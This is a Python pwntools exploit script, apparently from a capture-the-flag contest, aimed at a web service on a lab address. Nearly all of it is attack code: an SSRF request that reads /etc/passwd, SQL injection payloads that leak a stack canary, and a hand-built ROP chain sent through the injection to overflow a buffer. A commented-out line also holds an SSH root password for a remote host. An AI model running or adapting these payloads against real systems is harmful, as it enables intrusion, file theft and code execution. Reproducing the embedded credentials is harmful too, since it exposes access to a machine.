#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.arch = "amd64"
context.log_level = "debug"

#con = ssh(host="139.159.221.142", port=22, user="root", password="ddyHYC!$%Dc12")
#p = con.connect_remote("172.121.100.103", 8080)
p = remote('192.168.220.133', 8080)

#sample request

g = "a=1&"
exp = "login.html?a=1&username=admin&password=adminaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaanimda&menu=request&" 
exp += "para="

pay = "login.html?a=1&username=admin&password=adminaaaaaaaaaaaaaaa    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaanimda&menu=request&para=1".encode("hex")
#exp += ("login.html?a=1&username=admin&password=adminaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaanimda&menu=request&para=%s" % (pay)).encode("hex")
exp += "login.html?a=1&username=admin&password=adminaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaanimda&menu=parsefile&para=/etc/passwd HTTP/1.1 \r\nHost: 213\r\nCredentials: LG GRAM\r\n".encode("hex")

payload = "GET /%s HTTP/1.1 \r\n" \
          "Host: afang\r\n" \
          "Accept: text/html\r\n" \
          "Connection: close" % exp

#testing ssrf.

p.send(payload)

p.interactive()



#p.send(payload)
#p.interactive()

#testing sqli payloads

#fmtstr::

uri = "product.html"
post_payload = "POST /%s HTTP/1.1 \r\n" \
               "Host: afang\r\n" \
               "Accept-Encoding: /opt/xnuca/flag.txt\r\n" \
               "Accept: text/html\r\n" \
               "Connection: close\r\n\r\n" % uri

origin = "a" * 0x78
fck = ''
#data = "a=1&b=2&id=100 union select 1,2,3,concat('%s', '')" % (origin, fck) #sqli injection payload here.
data = "a=1&b=2&id=100 union select 1,2,3, concat('%s', 'a');" % (origin) #sqli injection payload here.

print data
payload = post_payload + data

p.send(payload)
p.recvuntil("1 2 3 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
canary = p.recv(7)
canary = "\x00" + canary
print hex(u64(canary))

origin = "overdue"
origin = origin.ljust(0x78, "a")
canaryhex = "00" + hex(u64(canary[::-1]))[2:]
wait("me")
padding = "a" * 0x10 
rbp    =     "7052600000000000"
poprdi =     "3c29400000000000"
bss_target = "fd3a400000000000"
printf_plt = "e013400000000000"


rophex = rbp + poprdi + bss_target + printf_plt
data2  = "a=1&b=2&id=100 union select 1,2,3,concat(concat(concat('%s', X'%s'), '%s'), X'%s')" % (origin, canaryhex, padding ,rophex) #sqli injection payload here.
data2  = "a=1&b=/etc/passwd&id=100 union select 1,2,concat(concat(concat('%s',0x%s),'%s'),0x%s),4 " % (origin, canaryhex, padding ,rophex) #sqli injection payload here.

p2 = remote("192.168.220.133", 8080)
#p2 = con.connect_remote("172.121.100.103", 8080)

payload2 = post_payload + data2 
p2.send(payload2)
p2.interactive()

#there's a fsb which can be exploited and might leads to a shell.
#waiting to add the exploit for that...